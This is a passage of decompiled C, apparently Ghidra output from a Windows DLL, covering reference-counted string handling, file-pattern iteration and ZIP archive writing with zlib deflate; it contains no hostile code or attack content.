              piVar7 = extraout_ECX_04;
            }
          }
          local_8._0_1_ = 0x13;
          if (local_a8 != (int *)0x0) {
            LOCK();
            iVar4 = *local_a8;
            piVar7 = (int *)*local_a8;
            *local_a8 = iVar4 + -1;
            UNLOCK();
            if (iVar4 + -1 < 0) {
              FUN_100579ee(local_a8);
              piVar7 = extraout_ECX_05;
            }
          }
          piVar11 = (int *)*piVar11;
          piVar10 = local_84;
          piVar5 = local_74;
        } while (piVar11 != (int *)*piVar13);
      }
      FUN_10037e50(piVar7);
      FUN_1000e520(extraout_ECX_06);
    }
    if (local_80 != (int *)0x0) {
      LOCK();
      iVar4 = *local_80;
      *local_80 = iVar4 + -1;
      UNLOCK();
      if (iVar4 + -1 < 0) {
        FUN_100579ee(local_80);
      }
    }
    if (piVar5 != (int *)0x0) {
      LOCK();
      iVar4 = *piVar5;
      *piVar5 = iVar4 + -1;
      UNLOCK();
      if (iVar4 + -1 < 0) {
        FUN_100579ee(piVar5);
      }
    }
    if (piVar10 == (int *)0x0) goto LAB_10036b0e;
    LOCK();
    iVar4 = *piVar10;
    *piVar10 = *piVar10 + -1;
    UNLOCK();
    local_c4 = piVar10;
  }
joined_r0x1003628f:
  if (iVar4 + -1 < 0) {
    FUN_100579ee(local_c4);
  }
LAB_10036b0e:
  ExceptionList = local_10;
  FUN_100579df();
  return;
}



/* Function: FUN_10036b30 */

void FUN_10036b30(int *param_1,undefined4 param_2)

{
  char cVar1;
  uint uVar2;
  int iVar3;
  int *piVar4;
  undefined **ppuVar5;
  int *piVar6;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10076d98;
  local_10 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  piVar6 = *(int **)*param_1;
  if (piVar6 != (int *)*param_1) {
    do {
      piVar4 = (int *)piVar6[2];
      if (piVar4 != (int *)0x0) {
        LOCK();
        *piVar4 = *piVar4 + 1;
        UNLOCK();
      }
      local_8 = 0;
      if (piVar4 == (int *)0x0) {
        iVar3 = 0;
        piVar4 = (int *)0x0;
      }
      else {
        iVar3 = piVar4[2];
        piVar4 = piVar4 + 3;
      }
      cVar1 = FUN_1004ab70(iVar3,piVar4,uVar2);
      if (cVar1 == '\0') {
        FUN_1000bfa0(&DAT_1008401c,0xffffffff);
      }
      piVar4 = (int *)FUN_1000bfa0(L"*.ext",0xffffffff);
      if ((piVar4 == (int *)0x0) || (ppuVar5 = (undefined **)(piVar4 + 3), piVar4[2] == 0)) {
        ppuVar5 = &PTR_10083554;
      }
      FUN_10036c20(ppuVar5,param_2);
      local_8 = 0xffffffff;
      if (piVar4 != (int *)0x0) {
        LOCK();
        iVar3 = *piVar4;
        *piVar4 = iVar3 + -1;
        UNLOCK();
        if (iVar3 + -1 < 0) {
          FUN_100579ee(piVar4);
        }
      }
      piVar6 = (int *)*piVar6;
    } while (piVar6 != (int *)*param_1);
  }
  ExceptionList = local_10;
  return;
}



/* Function: FUN_10036c20 */

int __thiscall FUN_10036c20(uint *param_1,short *param_2,uint param_3)

{
  int iVar1;
  uint uVar2;
  code *pcVar3;
  int *piVar4;
  undefined4 *puVar5;
  undefined4 *puVar6;
  int iVar7;
  uint *puVar8;
  uint uVar9;
  int *piVar10;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10076dd8;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  if ((param_2 == (short *)0x0) || (*param_2 != 0)) {
    piVar4 = (int *)FUN_1000bd10(DAT_100956e0 ^ (uint)&stack0xfffffffc);
  }
  else {
    piVar4 = (int *)FUN_1000ba60();
  }
  local_8 = 0;
  FUN_10020e80(param_3);
  if (piVar4 == (int *)0x0) {
    piVar10 = (int *)0x0;
  }
  else {
    piVar10 = piVar4 + 3;
  }
  puVar5 = (undefined4 *)FUN_1000fa00(0,0);
  local_8._0_1_ = 1;
  FUN_10020000(piVar10,0);
  local_8 = CONCAT31(local_8._1_3_,2);
  param_3 = 0;
  puVar8 = &param_3;
  if ((int)param_1[3] < 1) {
    puVar8 = param_1 + 3;
  }
  uVar2 = *puVar8;
  do {
    uVar2 = uVar2 - 1;
    if ((int)uVar2 < 0) {
      FUN_1000ba10();
      iVar7 = thunk_FUN_100579ee(puVar5);
      if (piVar4 != (int *)0x0) {
        LOCK();
        iVar1 = *piVar4;
        iVar7 = *piVar4;
        *piVar4 = iVar1 + -1;
        UNLOCK();
        if (iVar1 + -1 < 0) {
          iVar7 = FUN_100579ee(piVar4);
        }
      }
      ExceptionList = local_10;
      return iVar7;
    }
    if ((char)param_1[4] == '\0') {
      puVar6 = (undefined4 *)*puVar5;
      uVar9 = 0;
      if (uVar2 != 0) {
        do {
          if (puVar6 == puVar5) break;
          puVar6 = (undefined4 *)*puVar6;
          uVar9 = uVar9 + 1;
        } while (uVar9 < uVar2);
      }
      FUN_10034420();
    }
    puVar6 = (undefined4 *)*puVar5;
    uVar9 = 0;
    if (uVar2 != 0) {
      do {
        if (puVar6 == puVar5) break;
        puVar6 = (undefined4 *)*puVar6;
        uVar9 = uVar9 + 1;
      } while (uVar9 < uVar2);
    }
    param_3 = *param_1;
    iVar7 = FUN_10011570(param_3,*(undefined4 *)(param_3 + 4),puVar6 + 2);
    if (param_1[1] == 0x15555554) {
      FUN_10056a6a("list<T> too long");
      pcVar3 = (code *)swi(3);
      iVar7 = (*pcVar3)();
      return iVar7;
    }
    param_1[1] = param_1[1] + 1;
    *(int *)(param_3 + 4) = iVar7;
    **(int **)(iVar7 + 4) = iVar7;
  } while( true );
}



/* Function: FUN_10036da0 */

void __thiscall FUN_10036da0(int *param_1,undefined4 *param_2,int param_3)

{
  undefined4 *puVar1;
  int *piVar2;
  int iVar3;
  
  puVar1 = *(undefined4 **)*param_1;
  for (iVar3 = 0; (puVar1 != (undefined4 *)*param_1 && (param_3 != iVar3)); iVar3 = iVar3 + 1) {
    puVar1 = (undefined4 *)*puVar1;
  }
  piVar2 = (int *)puVar1[2];
  *param_2 = piVar2;
  if (piVar2 != (int *)0x0) {
    LOCK();
    *piVar2 = *piVar2 + 1;
    UNLOCK();
  }
  return;
}



/* Function: FUN_10036de0 */

undefined4 * __thiscall
FUN_10036de0(undefined4 *param_1,undefined4 param_2,undefined4 param_3,short *param_4,
            undefined4 param_5,undefined4 param_6,undefined4 param_7,undefined1 param_8,
            undefined4 param_9)

{
  uint uVar1;
  undefined4 uVar2;
  int *piVar3;
  undefined4 extraout_ECX;
  undefined **ppuVar4;
  int iVar5;
  bool bVar6;
  int *local_1c;
  int local_18;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10076e18;
  local_10 = ExceptionList;
  uVar1 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  *param_1 = 0;
  param_1[1] = 0;
  uVar2 = FUN_1000fa00(0,0);
  *param_1 = uVar2;
  param_1[2] = param_2;
  param_1[3] = param_7;
  *(undefined1 *)(param_1 + 4) = param_8;
  local_8._0_1_ = 1;
  local_8._1_3_ = 0;
  FUN_1001a230(param_3,extraout_ECX,param_9);
  local_8 = CONCAT31(local_8._1_3_,2);
  if (local_18 == 0) {
    if (local_1c == (int *)0x0) {
      ExceptionList = local_10;
      return param_1;
    }
    LOCK();
    iVar5 = *local_1c + -1;
    *local_1c = iVar5;
    UNLOCK();
    piVar3 = local_1c;
    goto joined_r0x10036f6d;
  }
  piVar3 = (int *)FUN_10010440(local_1c);
  bVar6 = param_4 != (short *)0x0;
  if (*param_4 == 0x5c) {
LAB_10036ee1:
    if ((piVar3 == (int *)0x0) || (ppuVar4 = (undefined **)(piVar3 + 3), piVar3[2] == 0))
    goto LAB_10036eee;
  }
  else {
    while (piVar3 != (int *)0x0) {
      iVar5 = piVar3[2];
      if (iVar5 == 0) goto LAB_10036ee1;
      ppuVar4 = (undefined **)(piVar3 + 3);
      if (iVar5 == 0) {
        ppuVar4 = &PTR_10083554;
      }
      if ((*(short *)((int)ppuVar4 + iVar5 * 2 + -2) == 0x5c) ||
         (piVar3 = (int *)FUN_1000bfa0(&DAT_1008401c,0xffffffff), !bVar6)) goto LAB_10036ee1;
      piVar3 = (int *)FUN_1000bfa0(param_4,0xffffffff);
      bVar6 = false;
    }
LAB_10036eee:
    ppuVar4 = &PTR_10083554;
  }
  FUN_10036c20(ppuVar4,param_5);
  iVar5 = param_1[1];
  if (iVar5 != 0) {
    param_1[3] = param_1[3] + -1;
  }
  if ((piVar3 == (int *)0x0) || (ppuVar4 = (undefined **)(piVar3 + 3), piVar3[2] == 0)) {
    ppuVar4 = &PTR_10083554;
  }
  FUN_10036c20(ppuVar4,param_6);
  if (iVar5 != 0) {
    param_1[3] = param_1[3] + 1;
  }
  FUN_10035cc0(param_1);
  if (local_1c != (int *)0x0) {
    LOCK();
    iVar5 = *local_1c;
    *local_1c = iVar5 + -1;
    UNLOCK();
    if (iVar5 + -1 < 0) {
      FUN_100579ee(local_1c);
    }
  }
  if (piVar3 == (int *)0x0) {
    ExceptionList = local_10;
    return param_1;
  }
  LOCK();
  iVar5 = *piVar3;
  *piVar3 = *piVar3 + -1;
  UNLOCK();
  iVar5 = iVar5 + -1;
joined_r0x10036f6d:
  if (iVar5 < 0) {
    FUN_100579ee(piVar3,uVar1);
  }
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_10036f90 */

int __fastcall FUN_10036f90(int param_1)

{
  FUN_1005ff60(param_1,0,0x38);
  *(undefined4 *)(param_1 + 0x38) = 0;
  *(undefined4 *)(param_1 + 0x3c) = 0;
  *(undefined4 *)(param_1 + 0x40) = 0;
  *(undefined4 *)(param_1 + 0x44) = 0;
  *(undefined4 *)(param_1 + 0x48) = 0;
  *(undefined4 *)(param_1 + 0x4c) = 0;
  *(undefined4 *)(param_1 + 0x50) = 0;
  *(undefined4 *)(param_1 + 0x54) = 0;
  FUN_1005ff60(param_1 + 0x58,0,0x4000);
  *(undefined4 *)(param_1 + 0x4058) = 0;
  *(undefined4 *)(param_1 + 0x405c) = 0;
  *(undefined4 *)(param_1 + 0x4060) = 0;
  *(undefined8 *)(param_1 + 0x4064) = 0;
  *(undefined4 *)(param_1 + 0x406c) = 0;
  *(undefined4 *)(param_1 + 0x4070) = 0;
  *(undefined4 *)(param_1 + 0x4074) = 0;
  FUN_1005ff60(param_1 + 0x58,0,0x4000);
  *(undefined8 *)(param_1 + 0x4064) = 0;
  *(undefined4 *)(param_1 + 0x406c) = 0;
  return param_1;
}



/* Function: FUN_10037060 */

void __fastcall FUN_10037060(int param_1)

{
  *(undefined4 *)(param_1 + 4) = 0;
  *(undefined4 *)(param_1 + 8) = 0;
  return;
}



/* Function: FUN_10037070 */

undefined4 * __thiscall
FUN_10037070(undefined4 *param_1,char *param_2,undefined4 param_3,undefined4 param_4,
            undefined4 param_5)

{
  uint uVar1;
  undefined4 uVar2;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10076e56;
  local_10 = ExceptionList;
  uVar1 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  *param_1 = param_5;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  FUN_10036f90(uVar1);
  param_1[0x1022] = 0;
  param_1[0x1023] = 0;
  param_1[0x1024] = 0;
  param_1[0x1025] = 0;
  local_8 = 0;
  if ((param_2 == (char *)0x0) || (*param_2 != '\0')) {
    uVar2 = FUN_100075b0();
  }
  else {
    uVar2 = FUN_10007ae0();
  }
  param_1[0x1026] = uVar2;
  local_8 = CONCAT31(local_8._1_3_,1);
  param_1[0x1027] = param_5;
  param_1[0x1028] = 0;
  param_1[0x1029] = 0;
  FUN_100371a0(param_2);
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_10037150 */

uint FUN_10037150(uint *param_1)

{
  uint uVar1;
  
  uVar1 = param_1[5];
  if (uVar1 < 0x7bd) {
    if (0x50 < uVar1) {
      uVar1 = uVar1 - 0x50;
    }
  }
  else {
    uVar1 = uVar1 - 0x7bc;
  }
  return (param_1[2] * 0x40 + param_1[1]) * 0x20 + (*param_1 >> 1) |
         ((param_1[4] + 1 + uVar1 * 0x10) * 0x20 + param_1[3]) * 0x10000;
}



/* Function: FUN_100371a0 */

void __thiscall FUN_100371a0(int param_1,undefined4 param_2)

{
  undefined4 *puVar1;
  int iVar2;
  undefined4 uVar3;
  undefined4 extraout_ECX;
  
  puVar1 = (undefined4 *)FUN_10058463(0x4098,&DAT_10098020);
  if (puVar1 == (undefined4 *)0x0) {
    return;
  }
  *puVar1 = *(undefined4 *)(param_1 + 0x409c);
  puVar1[1] = 0;
  puVar1[2] = 0;
  puVar1[3] = 0;
  FUN_10036f90();
  puVar1[0x1022] = 0;
  puVar1[0x1023] = 0;
  puVar1[0x1024] = 0;
  puVar1[0x1025] = 0;
  if (*(int *)(param_1 + 0x40a0) == 0) {
    (**(code **)**(undefined4 **)(param_1 + 0x409c))(param_2,0xb);
    iVar2 = (**(code **)(**(int **)(param_1 + 0x409c) + 0x18))();
    if (iVar2 == 0) {
      uVar3 = (**(code **)(**(int **)(param_1 + 0x409c) + 0xc))();
      puVar1[0x1022] = uVar3;
      puVar1[3] = 0;
      puVar1[0x12] = 0;
      puVar1[0x1024] = 0;
      puVar1[0x1023] = 0;
      puVar1[0x1025] = 0;
      *(undefined4 *)(param_1 + 0x40a0) = 1;
      FUN_100372b0(extraout_ECX);
      return;
    }
  }
  puVar1[1] = 0;
  puVar1[2] = 0;
  thunk_FUN_100579ee(puVar1);
  return;
}



/* Function: FUN_100372b0 */

int __fastcall FUN_100372b0(int param_1)

{
  *(undefined4 *)(param_1 + 4) = 0;
  *(undefined4 *)(param_1 + 8) = 0;
  thunk_FUN_100579ee(param_1);
  return param_1;
}



/* Function: FUN_100372d0 */

void FUN_100372d0(FILE *param_1,FILE *param_2)

{
  int *piVar1;
  int iVar2;
  FILE *pFVar3;
  int iVar4;
  int *piVar5;
  undefined8 uVar6;
  undefined8 uVar7;
  undefined6 uVar8;
  char *pcVar9;
  FILE *pFVar10;
  FILE *pFVar11;
  undefined1 *puVar12;
  undefined1 local_19c [8];
  undefined4 local_194;
  undefined4 local_190;
  undefined4 local_18c;
  undefined4 local_188;
  undefined4 local_184;
  undefined4 local_180;
  undefined4 local_17c;
  undefined4 local_178;
  undefined4 local_174;
  FILE *local_170;
  int *local_168;
  FILE *local_164;
  int local_160;
  FILE *local_15c;
  undefined1 local_158 [20];
  undefined1 local_144 [300];
  uint local_18;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10076e8b;
  local_10 = ExceptionList;
  local_18 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  local_170 = param_1;
  local_15c = param_2;
  local_164 = (FILE *)0x0;
  if ((param_1 == (FILE *)0x0) || (*(char *)&param_1->_ptr != '\0')) {
    uVar6 = FUN_100075b0(local_18);
  }
  else {
    uVar6 = FUN_10007ae0();
  }
  local_168 = (int *)uVar6;
  local_8 = 0;
  if (param_2 == (FILE *)0x0) {
    uVar7 = FUN_10027a40();
    uVar6 = CONCAT44((int)((ulonglong)uVar7 >> 0x20),local_168);
    param_2 = (FILE *)uVar7;
    local_15c = param_2;
  }
  local_168 = (int *)uVar6;
  piVar1 = local_168;
  puVar12 = local_158;
  local_194 = 0;
  local_190 = 0;
  local_18c = 0;
  local_188 = 0;
  local_184 = 0;
  local_180 = 0;
  local_17c = 0;
  local_178 = 0;
  local_174 = 0;
  pFVar10 = param_1;
  local_160 = FUN_1055d432((int)((ulonglong)uVar6 >> 0x20));
  piVar5 = piVar1;
  if (local_160 != -1) {
    FUN_10367d3e(piVar1,local_144,local_19c,pFVar10,puVar12);
    uVar8 = FUN_103e81eb(local_19c,(int)&local_17c + 2,&local_17c);
    piVar5 = piVar1 + 1;
    out(*piVar1,(short)((uint6)uVar8 >> 0x20));
    FUN_10403722((int)uVar8,local_160);
  }
  local_160 = 0;
  iVar2 = FUN_100375d0(param_2,&local_194,8);
  if (iVar2 == 0) {
    local_160 = 1;
    local_164 = _fopen((char *)param_1,"rb");
    if (local_164 != (FILE *)0x0) goto LAB_10037479;
    iVar2 = -1;
    pcVar9 = "error in opening %s for reading\n";
    pFVar10 = param_1;
  }
  else {
    pcVar9 = "error in opening %s in zipfile\n";
    pFVar10 = local_15c;
  }
  FUN_10006250(pcVar9,pFVar10);
LAB_10037479:
  pFVar11 = (FILE *)&DAT_00004000;
  pcVar9 = (char *)0x10037483;
  local_15c = (FILE *)FUN_100581b4(0x4000);
  pFVar10 = local_170;
  if (local_15c != (FILE *)0x0) {
    if (iVar2 == 0) {
      do {
        iVar2 = 0;
        pcVar9 = &DAT_00004000;
        pFVar11 = local_164;
        pFVar3 = (FILE *)_fread(local_15c,1,0x4000,local_164);
        if ((int)pFVar3 < 0x4000) {
          pcVar9 = (char *)0x100374e3;
          pFVar11 = local_164;
          iVar4 = _feof(local_164);
          if (iVar4 == 0) {
            pcVar9 = "error in reading %s\n";
            pFVar11 = pFVar10;
            FUN_10006250("error in reading %s\n",pFVar10);
            iVar2 = -1;
          }
        }
        if ((0 < (int)pFVar3) &&
           (pcVar9 = (char *)local_15c, pFVar11 = pFVar3, iVar2 = FUN_10037a70(local_15c,pFVar3),
           iVar2 < 0)) {
          pcVar9 = "error in writing %s in the zipfile\n";
          pFVar11 = pFVar10;
          FUN_10006250("error in writing %s in the zipfile\n",pFVar10);
        }
        param_1 = local_170;
        piVar5 = local_168;
      } while ((iVar2 == 0) && (0 < (int)pFVar3));
    }
    if (local_164 != (FILE *)0x0) {
      pcVar9 = (char *)0x10037549;
      pFVar11 = local_164;
      _fclose(local_164);
    }
    if ((local_160 != 0) && (iVar2 = FUN_10037b80(pcVar9,pFVar11), iVar2 != 0)) {
      FUN_10006250("error in closing %s in the zipfile\n",param_1);
    }
    FUN_100579ee(local_15c);
  }
  if (piVar5 != (int *)0x0) {
    LOCK();
    iVar2 = *piVar5;
    *piVar5 = *piVar5 + -1;
    UNLOCK();
    if (iVar2 + -1 < 0) {
      FUN_100579ee(piVar5);
    }
  }
  ExceptionList = local_10;
  FUN_100579df();
  return;
}



/* Function: FUN_100375d0 */

/* WARNING: Removing unreachable block (ram,0x100377eb) */
/* WARNING: Removing unreachable block (ram,0x1003770f) */
/* WARNING: Removing unreachable block (ram,0x100377bc) */
/* WARNING: Removing unreachable block (ram,0x100378f8) */

int __thiscall FUN_100375d0(int param_1,char *param_2,int param_3,uint param_4)

{
  char cVar1;
  undefined1 uVar2;
  int iVar3;
  undefined4 uVar4;
  undefined4 *puVar5;
  int iVar6;
  char *pcVar7;
  uint uVar8;
  char *pcVar9;
  uint uVar10;
  undefined4 in_stack_fffffff0;
  undefined4 in_stack_fffffff4;
  
  if ((param_4 != 0) && (param_4 != 8)) {
    return -0x66;
  }
  if ((*(int *)(param_1 + 0xc) != 1) ||
     (iVar3 = FUN_10037b80(in_stack_fffffff0,in_stack_fffffff4), iVar3 == 0)) {
    pcVar7 = "-";
    if (param_2 != (char *)0x0) {
      pcVar7 = param_2;
    }
    pcVar9 = pcVar7;
    do {
      cVar1 = *pcVar9;
      pcVar9 = pcVar9 + 1;
    } while (cVar1 != '\0');
    uVar10 = (int)pcVar9 - (int)(pcVar7 + 1);
    if (param_3 == 0) {
      *(undefined4 *)(param_1 + 0x4068) = 0;
    }
    else {
      iVar3 = *(int *)(param_3 + 0x18);
      if (iVar3 == 0) {
        iVar3 = FUN_10037150(param_3,pcVar7 + 1);
      }
      *(int *)(param_1 + 0x4068) = iVar3;
    }
    *(undefined4 *)(param_1 + 0x5c) = 2;
    *(undefined4 *)(param_1 + 0x406c) = 0;
    *(uint *)(param_1 + 0x60) = param_4;
    *(undefined4 *)(param_1 + 0x4070) = 0;
    *(undefined4 *)(param_1 + 0x48) = 0;
    *(undefined4 *)(param_1 + 0x4c) = 0;
    *(undefined4 *)(param_1 + 100) = 0;
    uVar4 = (**(code **)(**(int **)(param_1 + 0x409c) + 0xc))();
    *(undefined4 *)(param_1 + 0x50) = uVar4;
    *(uint *)(param_1 + 0x58) = uVar10 + 0x2e;
    puVar5 = (undefined4 *)FUN_100581b4(uVar10 + 0x2e);
    *(undefined4 **)(param_1 + 0x54) = puVar5;
    *puVar5 = 0x2014b50;
    *(undefined2 *)(*(int *)(param_1 + 0x54) + 4) = 0;
    *(undefined2 *)(*(int *)(param_1 + 0x54) + 6) = 0x14;
    iVar3 = *(int *)(param_1 + 0x54);
    uVar8 = *(uint *)(param_1 + 0x5c);
    *(char *)(iVar3 + 8) = (char)uVar8;
    *(char *)(iVar3 + 9) = (char)(uVar8 >> 8);
    if (uVar8 >> 0x10 != 0) {
      *(undefined2 *)(iVar3 + 8) = 0xffff;
    }
    iVar3 = *(int *)(param_1 + 0x54);
    uVar8 = *(uint *)(param_1 + 0x60);
    *(char *)(iVar3 + 10) = (char)uVar8;
    *(char *)(iVar3 + 0xb) = (char)(uVar8 >> 8);
    if (uVar8 >> 0x10 != 0) {
      *(undefined2 *)(iVar3 + 10) = 0xffff;
    }
    iVar3 = *(int *)(param_1 + 0x54);
    uVar4 = *(undefined4 *)(param_1 + 0x4068);
    *(char *)(iVar3 + 0xc) = (char)uVar4;
    *(char *)(iVar3 + 0xd) = (char)((uint)uVar4 >> 8);
    *(char *)(iVar3 + 0xe) = (char)((uint)uVar4 >> 0x10);
    *(char *)(iVar3 + 0xf) = (char)((uint)uVar4 >> 0x18);
    *(undefined4 *)(*(int *)(param_1 + 0x54) + 0x10) = 0;
    *(undefined4 *)(*(int *)(param_1 + 0x54) + 0x14) = 0;
    *(undefined4 *)(*(int *)(param_1 + 0x54) + 0x18) = 0;
    iVar3 = *(int *)(param_1 + 0x54);
    uVar2 = (undefined1)(uVar10 >> 8);
    *(undefined1 *)(iVar3 + 0x1d) = uVar2;
    *(char *)(iVar3 + 0x1c) = (char)uVar10;
    if (uVar10 >> 0x10 != 0) {
      *(undefined2 *)(iVar3 + 0x1c) = 0xffff;
    }
    *(undefined2 *)(*(int *)(param_1 + 0x54) + 0x1e) = 0;
    *(undefined2 *)(*(int *)(param_1 + 0x54) + 0x20) = 0;
    *(undefined2 *)(*(int *)(param_1 + 0x54) + 0x22) = 0;
    if (param_3 == 0) {
      *(undefined2 *)(*(int *)(param_1 + 0x54) + 0x24) = 0;
      *(undefined4 *)(*(int *)(param_1 + 0x54) + 0x26) = 0;
    }
    else {
      iVar3 = *(int *)(param_1 + 0x54);
      uVar8 = *(uint *)(param_3 + 0x1c);
      *(char *)(iVar3 + 0x24) = (char)uVar8;
      *(char *)(iVar3 + 0x25) = (char)(uVar8 >> 8);
      if (uVar8 >> 0x10 != 0) {
        *(undefined2 *)(iVar3 + 0x24) = 0xffff;
      }
      iVar3 = *(int *)(param_1 + 0x54);
      uVar4 = *(undefined4 *)(param_3 + 0x20);
      *(char *)(iVar3 + 0x26) = (char)uVar4;
      *(char *)(iVar3 + 0x27) = (char)((uint)uVar4 >> 8);
      *(char *)(iVar3 + 0x28) = (char)((uint)uVar4 >> 0x10);
      *(char *)(iVar3 + 0x29) = (char)((uint)uVar4 >> 0x18);
    }
    iVar6 = *(int *)(param_1 + 0x50) - *(int *)(param_1 + 0x408c);
    iVar3 = *(int *)(param_1 + 0x54);
    *(char *)(iVar3 + 0x2a) = (char)iVar6;
    *(char *)(iVar3 + 0x2b) = (char)((uint)iVar6 >> 8);
    *(char *)(iVar3 + 0x2c) = (char)((uint)iVar6 >> 0x10);
    *(char *)(iVar3 + 0x2d) = (char)((uint)iVar6 >> 0x18);
    uVar8 = 0;
    if (uVar10 != 0) {
      do {
        *(char *)(*(int *)(param_1 + 0x54) + 0x2e + uVar8) = pcVar7[uVar8];
        uVar8 = uVar8 + 1;
      } while (uVar8 < uVar10);
    }
    if (*(int *)(param_1 + 0x54) == 0) {
      return -0x68;
    }
    param_4 = 0x4034b50;
    iVar3 = (**(code **)(**(int **)(param_1 + 0x409c) + 8))(&param_4,4);
    if (iVar3 == 4) {
      param_4 = CONCAT22(param_4._2_2_,0x14);
      iVar6 = (**(code **)(**(int **)(param_1 + 0x409c) + 8))(&param_4,2);
      iVar3 = -1;
      if (iVar6 == 2) {
        param_4._0_2_ = (undefined2)*(uint *)(param_1 + 0x5c);
        if (*(uint *)(param_1 + 0x5c) >> 0x10 != 0) {
          param_4._0_2_ = 0xffff;
        }
        iVar3 = (**(code **)(**(int **)(param_1 + 0x409c) + 8))(&param_4,2);
        if (iVar3 == 2) {
          param_4._0_2_ = (undefined2)*(uint *)(param_1 + 0x60);
          if (*(uint *)(param_1 + 0x60) >> 0x10 != 0) {
            param_4._0_2_ = 0xffff;
          }
          iVar3 = (**(code **)(**(int **)(param_1 + 0x409c) + 8))(&param_4,2);
          if (iVar3 == 2) {
            param_4 = *(uint *)(param_1 + 0x4068);
            iVar3 = (**(code **)(**(int **)(param_1 + 0x409c) + 8))(&param_4,4);
            if (iVar3 == 4) {
              param_4 = 0;
              iVar3 = (**(code **)(**(int **)(param_1 + 0x409c) + 8))(&param_4,4);
              if (iVar3 == 4) {
                param_4 = 0;
                iVar3 = (**(code **)(**(int **)(param_1 + 0x409c) + 8))(&param_4,4);
                if (iVar3 == 4) {
                  param_4 = 0;
                  iVar3 = (**(code **)(**(int **)(param_1 + 0x409c) + 8))(&param_4,4);
                  if (iVar3 == 4) {
                    param_4 = CONCAT31(CONCAT21(param_4._2_2_,uVar2),(char)uVar10);
                    if (uVar10 >> 0x10 != 0) {
                      param_4 = CONCAT22(param_4._2_2_,0xffff);
                    }
                    iVar3 = (**(code **)(**(int **)(param_1 + 0x409c) + 8))(&param_4,2);
                    if (iVar3 == 2) {
                      param_4 = param_4 & 0xffff0000;
                      iVar3 = (**(code **)(**(int **)(param_1 + 0x409c) + 8))(&param_4,2);
                      if (iVar3 == 2) {
                        iVar3 = 0;
                        if ((uVar10 != 0) &&
                           (uVar8 = (**(code **)(**(int **)(param_1 + 0x409c) + 8))(pcVar7,uVar10),
                           uVar8 != uVar10)) {
                          iVar3 = -1;
                        }
                      }
                      else {
                        iVar3 = -1;
                      }
                    }
                    else {
                      iVar3 = -1;
                    }
                  }
                  else {
                    iVar3 = -1;
                  }
                }
                else {
                  iVar3 = -1;
                }
              }
              else {
                iVar3 = -1;
              }
            }
            else {
              iVar3 = -1;
            }
          }
          else {
            iVar3 = -1;
          }
        }
        else {
          iVar3 = -1;
        }
      }
    }
    else {
      iVar3 = -1;
    }
    *(undefined4 *)(param_1 + 0x14) = 0;
    *(undefined4 *)(param_1 + 0x20) = 0x4000;
    *(int *)(param_1 + 0x1c) = param_1 + 0x68;
    *(undefined4 *)(param_1 + 0x18) = 0;
    *(undefined4 *)(param_1 + 0x24) = 0;
    if (iVar3 == 0) {
      if ((*(int *)(param_1 + 0x60) == 8) && (*(int *)(param_1 + 100) == 0)) {
        *(undefined4 *)(param_1 + 0x30) = 0;
        *(undefined4 *)(param_1 + 0x34) = 0;
        *(undefined4 *)(param_1 + 0x38) = 0;
        iVar3 = FUN_10002660(param_1 + 0x10,9,8,0xfffffff1,8,0,"1.2.3",0x38);
        if (iVar3 != 0) {
          return iVar3;
        }
        *(undefined4 *)(param_1 + 0x48) = 1;
        iVar3 = 0;
      }
      *(undefined4 *)(param_1 + 0xc) = 1;
    }
  }
  return iVar3;
}



/* Function: FUN_10037a70 */

int __thiscall FUN_10037a70(int param_1,undefined4 param_2,undefined4 param_3)

{
  undefined4 uVar1;
  int iVar2;
  uint uVar3;
  int *piVar4;
  int iVar5;
  uint uVar6;
  int local_8;
  
  local_8 = 0;
  if (*(int *)(param_1 + 0xc) == 0) {
    return -0x66;
  }
  *(undefined4 *)(param_1 + 0x14) = param_3;
  *(undefined4 *)(param_1 + 0x10) = param_2;
  uVar1 = FUN_10002b20(*(undefined4 *)(param_1 + 0x406c),param_2,param_3);
  *(undefined4 *)(param_1 + 0x406c) = uVar1;
  while( true ) {
    if (*(int *)(param_1 + 0x14) == 0) {
      return local_8;
    }
    if (*(int *)(param_1 + 0x20) == 0) {
      iVar5 = 0;
      iVar2 = (**(code **)(**(int **)(param_1 + 0x409c) + 8))
                        (param_1 + 0x68,*(undefined4 *)(param_1 + 0x4c));
      if (iVar2 != *(int *)(param_1 + 0x4c)) {
        iVar5 = -1;
      }
      *(int *)(param_1 + 0x1c) = param_1 + 0x68;
      *(undefined4 *)(param_1 + 0x4c) = 0;
      *(undefined4 *)(param_1 + 0x20) = 0x4000;
      if (iVar5 == -1) {
        local_8 = -1;
      }
    }
    piVar4 = (int *)(param_1 + 0x10);
    if (local_8 != 0) break;
    if ((*(int *)(param_1 + 0x60) == 8) && (*(int *)(param_1 + 100) == 0)) {
      iVar2 = *(int *)(param_1 + 0x24);
      local_8 = FUN_10001080(piVar4,0);
      *(int *)(param_1 + 0x4c) = *(int *)(param_1 + 0x4c) + (*(int *)(param_1 + 0x24) - iVar2);
      if (local_8 != 0) {
        return local_8;
      }
    }
    else {
      uVar6 = *(uint *)(param_1 + 0x20);
      if (*(uint *)(param_1 + 0x14) < *(uint *)(param_1 + 0x20)) {
        uVar6 = *(uint *)(param_1 + 0x14);
      }
      uVar3 = 0;
      if (uVar6 != 0) {
        do {
          *(undefined1 *)(uVar3 + *(int *)(param_1 + 0x1c)) = *(undefined1 *)(uVar3 + *piVar4);
          uVar3 = uVar3 + 1;
        } while (uVar3 < uVar6);
      }
      *(int *)(param_1 + 0x14) = *(int *)(param_1 + 0x14) - uVar6;
